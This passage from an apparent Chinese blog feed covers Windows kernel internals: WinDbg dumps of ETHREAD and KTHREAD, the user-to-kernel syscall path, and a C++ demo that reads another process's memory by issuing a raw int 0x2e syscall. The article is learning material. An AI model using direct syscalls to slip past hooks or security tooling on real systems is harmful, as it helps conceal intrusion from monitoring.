class="line">   +0x214 PostBlockList    : _LIST_ENTRY</span><br><span class="line">   +0x214 ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   +0x218 StartAddress     : Ptr32 Void</span><br><span class="line">   +0x21c TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   +0x21c ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   +0x21c KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   +0x220 ActiveTimerListLock : Uint4B</span><br><span class="line">   +0x224 ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   +0x22c Cid              : _CLIENT_ID</span><br><span class="line">   +0x234 KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x234 AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x248 ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   +0x24c IrpList          : _LIST_ENTRY</span><br><span class="line">   +0x254 TopLevelIrp      : Uint4B</span><br><span class="line">   +0x258 DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +0x25c CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   +0x260 Win32StartAddress : Ptr32 Void</span><br><span class="line">   +0x264 LegacyPowerObject : Ptr32 Void</span><br><span class="line">   +0x268 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x270 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x274 ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   +0x278 ReadClusterSize  : Uint4B</span><br><span class="line">   +0x27c MmLockOrdering   : Int4B</span><br><span class="line">   +0x280 CrossThreadFlags : Uint4B</span><br><span class="line">   +0x280 Terminated       : Pos 0, 1 Bit</span><br><span class="line">   +0x280 ThreadInserted   : Pos 1, 1 Bit</span><br><span class="line">   +0x280 HideFromDebugger : Pos 2, 1 Bit</span><br><span class="line">   +0x280 ActiveImpersonationInfo : Pos 3, 1 Bit</span><br><span class="line">   +0x280 Reserved         : Pos 4, 1 Bit</span><br><span class="line">   +0x280 HardErrorsAreDisabled : Pos 5, 1 Bit</span><br><span class="line">   +0x280 BreakOnTermination : Pos 6, 1 Bit</span><br><span class="line">   +0x280 SkipCreationMsg  : Pos 7, 1 Bit</span><br><span class="line">   +0x280 SkipTerminationMsg : Pos 8, 1 Bit</span><br><span class="line">   +0x280 CopyTokenOnOpen  : Pos 9, 1 Bit</span><br><span class="line">   +0x280 ThreadIoPriority : Pos 10, 3 Bits</span><br><span class="line">   +0x280 ThreadPagePriority : Pos 13, 3 Bits</span><br><span class="line">   +0x280 RundownFail      : Pos 16, 1 Bit</span><br><span class="line">   +0x280 NeedsWorkingSetAging : Pos 17, 1 Bit</span><br><span class="line">   +0x284 SameThreadPassiveFlags : Uint4B</span><br><span class="line">   +0x284 ActiveExWorker   : Pos 0, 1 Bit</span><br><span class="line">   +0x284 ExWorkerCanWaitUser : Pos 1, 1 Bit</span><br><span class="line">   +0x284 MemoryMaker      : Pos 2, 1 Bit</span><br><span class="line">   +0x284 ClonedThread     : Pos 3, 1 Bit</span><br><span class="line">   +0x284 KeyedEventInUse  : Pos 4, 1 Bit</span><br><span class="line">   +0x284 RateApcState     : Pos 5, 2 Bits</span><br><span class="line">   +0x284 SelfTerminate    : Pos 7, 1 Bit</span><br><span class="line">   +0x288 SameThreadApcFlags : Uint4B</span><br><span class="line">   +0x288 Spare            : Pos 0, 1 Bit</span><br><span class="line">   +0x288 StartAddressInvalid : Pos 1, 1 Bit</span><br><span class="line">   +0x288 EtwPageFaultCalloutActive : Pos 2, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetExclusive : Pos 3, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetShared : Pos 4, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetExclusive : Pos 5, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetShared : Pos 6, 1 Bit</span><br><span class="line">   +0x288 OwnsSessionWorkingSetExclusive : Pos 7, 1 Bit</span><br><span class="line">   +0x289 OwnsSessionWorkingSetShared : Pos 0, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceExclusive : Pos 1, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceShared : Pos 2, 1 Bit</span><br><span class="line">   +0x289 SuppressSymbolLoad : Pos 3, 1 Bit</span><br><span class="line">   +0x289 Prefetching      : Pos 4, 1 Bit</span><br><span class="line">   +0x289 OwnsDynamicMemoryShared : Pos 5, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaExclusive : Pos 6, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaShared : Pos 7, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetExclusive : Pos 0, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetShared : Pos 1, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetExclusive : Pos 2, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetShared : Pos 3, 1 Bit</span><br><span class="line">   +0x28a TrimTrigger      : Pos 4, 2 Bits</span><br><span class="line">   +0x28a Spare1           : Pos 6, 2 Bits</span><br><span class="line">   +0x28b PriorityRegionActive : UChar</span><br><span class="line">   +0x28c CacheManagerActive : UChar</span><br><span class="line">   +0x28d DisablePageFaultClustering : UChar</span><br><span class="line">   +0x28e ActiveFaultCount : UChar</span><br><span class="line">   +0x28f LockOrderState   : UChar</span><br><span class="line">   +0x290 AlpcMessageId    : Uint4B</span><br><span class="line">   +0x294 AlpcMessage      : Ptr32 Void</span><br><span class="line">   +0x294 AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   +0x298 AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   +0x2a0 CacheManagerCount : Uint4B</span><br><span class="line">   +0x2a4 IoBoostCount     : Uint4B</span><br><span class="line">   +0x2a8 IrpListLock      : Uint4B</span><br><span class="line">   +0x2ac ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   +0x2b0 CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x2b4 KernelStackReference : Uint4B</span><br></pre></td></tr></table></figure><p>其中 <code>TCB</code> 就是 <code>KTHREAD</code> 结构体，因此 <code>ETHREAD</code> 包含 <code>KTHREAD</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 CycleTime        : Uint8B</span><br><span class="line">   +0x018 HighCycleTime    : Uint4B</span><br><span class="line">   +0x020 QuantumTarget    : Uint8B</span><br><span class="line">   +0x028 InitialStack     : Ptr32 Void</span><br><span class="line">   +0x02c StackLimit       : Ptr32 Void</span><br><span class="line">   +0x030 KernelStack      : Ptr32 Void</span><br><span class="line">   +0x034 ThreadLock       : Uint4B</span><br><span class="line">   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x039 Running          : UChar</span><br><span class="line">   +0x03a Alerted          : [2] UChar</span><br><span class="line">   +0x03c KernelStackResident : Pos 0, 1 Bit</span><br><span class="line">   +0x03c ReadyTransition  : Pos 1, 1 Bit</span><br><span class="line">   +0x03c ProcessReadyQueue : Pos 2, 1 Bit</span><br><span class="line">   +0x03c WaitNext         : Pos 3, 1 Bit</span><br><span class="line">   +0x03c SystemAffinityActive : Pos 4, 1 Bit</span><br><span class="line">   +0x03c Alertable        : Pos 5, 1 Bit</span><br><span class="line">   +0x03c GdiFlushActive   : Pos 6, 1 Bit</span><br><span class="line">   +0x03c UserStackWalkActive : Pos 7, 1 Bit</span><br><span class="line">   +0x03c ApcInterruptRequest : Pos 8, 1 Bit</span><br><span class="line">   +0x03c ForceDeferSchedule : Pos 9, 1 Bit</span><br><span class="line">   +0x03c QuantumEndMigrate : Pos 10, 1 Bit</span><br><span class="line">   +0x03c UmsDirectedSwitchEnable : Pos 11, 1 Bit</span><br><span class="line">   +0x03c TimerActive      : Pos 12, 1 Bit</span><br><span class="line">   +0x03c SystemThread     : Pos 13, 1 Bit</span><br><span class="line">   +0x03c Reserved         : Pos 14, 18 Bits</span><br><span class="line">   +0x03c MiscFlags        : Int4B</span><br><span class="line">   +0x040 ApcState         : _KAPC_STATE</span><br><span class="line">   +0x040 ApcStateFill     : [23] UChar</span><br><span class="line">   +0x057 Priority         : Char</span><br><span class="line">   +0x058 NextProcessor    : Uint4B</span><br><span class="line">   +0x05c DeferredProcessor : Uint4B</span><br><span class="line">   +0x060 ApcQueueLock     : Uint4B</span><br><span class="line">   +0x064 ContextSwitches  : Uint4B</span><br><span class="line">   +0x068 State            : UChar</span><br><span class="line">   +0x069 NpxState         : Char</span><br><span class="line">   +0x06a WaitIrql         : UChar</span><br><span class="line">   +0x06b WaitMode         : Char</span><br><span class="line">   +0x06c WaitStatus       : Int4B</span><br><span class="line">   +0x070 WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   +0x074 WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   +0x074 SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x07c Queue            : Ptr32 _KQUEUE</span><br><span class="line">   +0x080 WaitTime         : Uint4B</span><br><span class="line">   +0x084 KernelApcDisable : Int2B</span><br><span class="line">   +0x086 SpecialApcDisable : Int2B</span><br><span class="line">   +0x084 CombinedApcDisable : Uint4B</span><br><span class="line">   +0x088 Teb              : Ptr32 Void</span><br><span class="line">   +0x090 Timer            : _KTIMER</span><br><span class="line">   +0x0b8 AutoAlignment    : Pos 0, 1 Bit</span><br><span class="line">   +0x0b8 DisableBoost     : Pos 1, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc1Inserted : Pos 2, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc2Inserted : Pos 3, 1 Bit</span><br><span class="line">   +0x0b8 CalloutActive    : Pos 4, 1 Bit</span><br><span class="line">   +0x0b8 ApcQueueable     : Pos 5, 1 Bit</span><br><span class="line">   +0x0b8 EnableStackSwap  : Pos 6, 1 Bit</span><br><span class="line">   +0x0b8 GuiThread        : Pos 7, 1 Bit</span><br><span class="line">   +0x0b8 UmsPerformingSyscall : Pos 8, 1 Bit</span><br><span class="line">   +0x0b8 VdmSafe          : Pos 9, 1 Bit</span><br><span class="line">   +0x0b8 UmsDispatched    : Pos 10, 1 Bit</span><br><span class="line">   +0x0b8 ReservedFlags    : Pos 11, 21 Bits</span><br><span class="line">   +0x0b8 ThreadFlags      : Int4B</span><br><span class="line">   +0x0bc ServiceTable     : Ptr32 Void</span><br><span class="line">   +0x0c0 WaitBlock        : [4] _KWAIT_BLOCK</span><br><span class="line">   +0x120 QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   +0x128 TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   +0x12c FirstArgument    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackStack    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackDepth    : Uint4B</span><br><span class="line">   +0x134 ApcStateIndex    : UChar</span><br><span class="line">   +0x135 BasePriority     : Char</span><br><span class="line">   +0x136 PriorityDecrement : Char</span><br><span class="line">   +0x136 ForegroundBoost  : Pos 0, 4 Bits</span><br><span class="line">   +0x136 UnusualBoost     : Pos 4, 4 Bits</span><br><span class="line">   +0x137 Preempted        : UChar</span><br><span class="line">   +0x138 AdjustReason     : UChar</span><br><span class="line">   +0x139 AdjustIncrement  : Char</span><br><span class="line">   +0x13a PreviousMode     : Char</span><br><span class="line">   +0x13b Saturation       : Char</span><br><span class="line">   +0x13c SystemCallNumber : Uint4B</span><br><span class="line">   +0x140 FreezeCount      : Uint4B</span><br><span class="line">   +0x144 UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   +0x150 Process          : Ptr32 _KPROCESS</span><br><span class="line">   +0x154 Affinity         : _GROUP_AFFINITY</span><br><span class="line">   +0x160 IdealProcessor   : Uint4B</span><br><span class="line">   +0x164 UserIdealProcessor : Uint4B</span><br><span class="line">   +0x168 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcState    : _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcStateFill : [23] UChar</span><br><span class="line">   +0x187 WaitReason       : UChar</span><br><span class="line">   +0x188 SuspendCount     : Char</span><br><span class="line">   +0x189 Spare1           : Char</span><br><span class="line">   +0x18a OtherPlatformFill : UChar</span><br><span class="line">   +0x18c Win32Thread      : Ptr32 Void</span><br><span class="line">   +0x190 StackBase        : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApc       : _KAPC</span><br><span class="line">   +0x194 SuspendApcFill0  : [1] UChar</span><br><span class="line">   +0x195 ResourceIndex    : UChar</span><br><span class="line">   +0x194 SuspendApcFill1  : [3] UChar</span><br><span class="line">   +0x197 QuantumReset     : UChar</span><br><span class="line">   +0x194 SuspendApcFill2  : [4] UChar</span><br><span class="line">   +0x198 KernelTime       : Uint4B</span><br><span class="line">   +0x194 SuspendApcFill3  : [36] UChar</span><br><span class="line">   +0x1b8 WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   +0x194 SuspendApcFill4  : [40] UChar</span><br><span class="line">   +0x1bc LegoData         : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApcFill5  : [47] UChar</span><br><span class="line">   +0x1c3 LargeStack       : UChar</span><br><span class="line">   +0x1c4 UserTime         : Uint4B</span><br><span class="line">   +0x1c8 SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x1c8 SuspendSemaphorefill : [20] UChar</span><br><span class="line">   +0x1dc SListFaultCount  : Uint4B</span><br><span class="line">   +0x1e0 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x1e8 MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +0x1f0 SListFaultAddress : Ptr32 Void</span><br><span class="line">   +0x1f4 ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   +0x1f8 XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><p>来看看几个重要成员</p><ul><li><code>PreviousMode</code>：先前模式，如果0环调用的，值为<code>0</code>。如果为3环调用的，值为<code>1</code>。</li><li><code>DebugActive</code>：调试活动状态，指示当前线程是否处于调试状态。如果这个成员被设成0，则会影响硬件断点无法断下。</li><li><code>TrapFrame</code>：栈帧，一个线程一个栈帧结构体。</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_3</a></li><li>[2]：<a href="https://www.cnblogs.com/wingsummer/p/15543945.html">https://www.cnblogs.com/wingsummer/p/15543945.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下Windows系统调用的相关结构体</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——R3到R0</title>
    <link href="https://xia0ji233.github.io/2025/01/21/WindowsSyscall1/"/>
    <id>https://xia0ji233.github.io/2025/01/21/WindowsSyscall1/</id>
    <published>2025-01-21T13:00:00.000Z</published>
    <updated>2025-01-21T13:49:03.074Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下windows的系统调用</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>API，应用程序接口（Application Programming Interface）。Windows API 顾名思义就是 Windows 提供的应用程序接口，为了在 Windows 上实现一定的功能，我们需要学习 API 的用途、传参、返回值等，微软对这部分都提供了大量的文档说明，因此详细学习 API 的实现原理对我们而言是很有必要的。</p><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p>先介绍几个比较重要的 DLL，几乎所有的 Windows 应用程序都会有对这些 DLL 的使用。</p><ul><li><code>Kernel32.dll</code>：最核心的功能模块，比如管理内存、进程和线程相关的函数等。</li><li><code>User32.dll</code>：是 <code>Windows</code> 用户界面相关应用程序接口，如创建窗口和发送消息等。</li><li><code>GDI32.dll</code>：全称是 <code>Graphical Device Interface</code>，即<strong>图形设备接口</strong>，包含用于画图和显示文本的函数.比如要显示一个程序窗口，就调用了其中的函数来画这个窗口。</li><li><code>Ntdll.dll</code>：大多数 <code>API</code> 都会通过这个 <code>DLL</code> 进入内核。</li></ul><p>并不是所有的 API 都需要进 Ring0，比如 <code>strlen</code> 之类的函数，Ring3 就能实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">char</span> *s)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*s)&#123;</span><br><span class="line">        len++;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是大部分跨进程操作，调度等都是需要进入 Ring0 的，比如跨进程读API：<code>ReadProcessMemory</code>。</p><p>这里可以直接调试看看链路，入口点通常是 kernel32.dll 的 ReadProcessMemory，最后调用了 kernelbase.dll的 ReadProcessMemory。</p><img src="/2025/01/21/WindowsSyscall1/1.png" class=""><p>这里的 <code>NtReadVirtualMemory</code> 导入自 <code>ntdll.dll</code>，同样来到这里</p><img src="/2025/01/21/WindowsSyscall1/2.png" class=""><p>发现这里的 <code>NtReadVirtualMemory</code> 仅仅是通过一个标志位选择走 <code>syscall</code> 指令或者 <code>int 0x2E</code> 指令。</p><p>这里的标志位在 <code>0x7ffe0000</code> 页内，是用于保存一个 <strong>_KUSER_SHARED_DATA</strong> 结构体使用的，不过这里看到指向了一个 <code>SystemCallPad </code> 保留结构，不太清楚为啥。通过中断门去调用这个好说，毕竟前面学过中断门是 r3 到 r0 的一个途径之一。</p><h2 id="syscall实现"><a href="#syscall实现" class="headerlink" title="syscall实现"></a>syscall实现</h2><p>主要来讲讲 syscall 的实现，CPU有一个 MSR 寄存器，每个 MSR寄存器都有一个 id ，叫 MSR Index。</p><table><thead><tr><th align="center">MSR</th><th align="center">Index</th></tr></thead><tbody><tr><td align="center">IA32_SYSENTER_CS</td><td align="center">174H</td></tr><tr><td align="center">IA32_SYSENTER_ESP</td><td align="center">175H</td></tr><tr><td align="center">IA32_SYSENTER_EIP</td><td align="center">176H</td></tr></tbody></table><p>来到windbg可以通过 0x176 的rdmsr命令得到系统调用入口。</p><img src="/2025/01/21/WindowsSyscall1/3.png" class=""><p>0x174 和 0x175 则分别表示进入系统调用后新的 CS 和 ESP 的值，SS 默认为 CS+8。</p><h2 id="中断门实现"><a href="#中断门实现" class="headerlink" title="中断门实现"></a>中断门实现</h2><p>直接查看 idt 表看看入口点即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !idt 0x2e</span><br><span class="line"></span><br><span class="line">Dumping IDT: 80b93000</span><br><span class="line"></span><br><span class="line">2e:83c77fea nt!KiSystemService</span><br></pre></td></tr></table></figure><hr><p>为什么说直接的 <code>syscall</code> 或者 <code>sysenter</code> 叫快速系统调用，因为中断门跳过去的过程涉及到读内存（IDT表），而直接 <code>syscall</code> 或者 <code>sysenter</code> 跳过去仅仅是读取了 <code>MSR</code> 寄存器。</p><hr><p>这里也算摸清楚了，<code>_KUSER_SHARED_DATA+0x300</code> 上存了 <code>KiIntSystemCall</code> 或 <code>KiFastSystemCall</code> 其中之一，而 <code>KiInitSystemCall</code> 就是 <code>int 0x2e;ret</code>，而另一个则是 <code>sysenter;ret</code>。</p><h2 id="Windows系统调用约定"><a href="#Windows系统调用约定" class="headerlink" title="Windows系统调用约定"></a>Windows系统调用约定</h2><p>这玩意跟之前的都不一样，其主要原因便是，Intel 给的中断门不支持传参，不像调用门那样，给定传参个数在执行 <code>call far</code> 指令的时候就会把 R3 栈中的参数全部搬到 R0 栈，那么直接在 R0 层写代码跟 R3 层写代码没什么不同了，可以使用同样类型的调用约定。</p><p>Windows 的所有系统调用都要求我们把参数按顺序排列放到一个内存中，将该内存的指针给到 EDX 寄存器。</p><p>回顾一下 Linux 的系统调用，同样也是不同于 R3 层的各种调用约定，通常参数小于五个的系统调用会依次把参数传给 <code>EBX,ECX,EDX,ESI,EDI</code> 中，而超过五个参数的系统调用则与 Windows 的做法一样，不过是将参数地址保存到了 EBX 中。</p><p>据此可以编写不依赖任何动态库的 <code>ReadProcessMemory</code> 函数。</p><p>测试程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a = %p\n&quot;</span>, &amp;a);</span><br><span class="line">    DWORD PID = GetCurrentProcessId();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID = %d\n&quot;</span>, PID);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据该程序运行结果，编写第二个程序，通过中断门调用 <code>ReadProcessMemory</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpNumberOfBytesRead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">                lea  eax, [ebp + <span class="number">0x14</span>]</span><br><span class="line">                push eax; ReturnLength</span><br><span class="line">                push[ebp + <span class="number">0x14</span>]; BufferLength</span><br><span class="line">                push[ebp + <span class="number">0x10</span>]; Buffer</span><br><span class="line">                push[ebp + <span class="number">0x0C</span>]; BaseAddress</span><br><span class="line">                push[ebp + <span class="number">0x08</span>]; ProcessHandle</span><br><span class="line">                mov  eax, <span class="number">0115</span>h</span><br><span class="line">                mov  edx, esp</span><br><span class="line">                <span class="type">int</span>  <span class="number">0x2e</span> </span><br><span class="line">                add  esp, <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read=%d\n&quot;</span>,*lpNumberOfBytesRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD PID = <span class="number">3112</span>;</span><br><span class="line">    DWORD pBuffer;</span><br><span class="line">    DWORD reads=<span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, PID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hProcess = %x \n&quot;</span>, hProcess);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;pBuffer, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">MyReadProcessMemory</span>(hProcess, (PVOID)<span class="number">0x19f82C</span>, &amp;pBuffer, <span class="number">4</span>, &amp;reads);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pBuffer = %x \n&quot;</span>, pBuffer);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2025/01/21/WindowsSyscall1/4.png" class=""><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：MSDN</li><li>[2]：<a href="https://www.cnblogs.com/onetrainee/p/11705191.html">https://www.cnblogs.com/onetrainee/p/11705191.html</a></li><li>[3]：<a 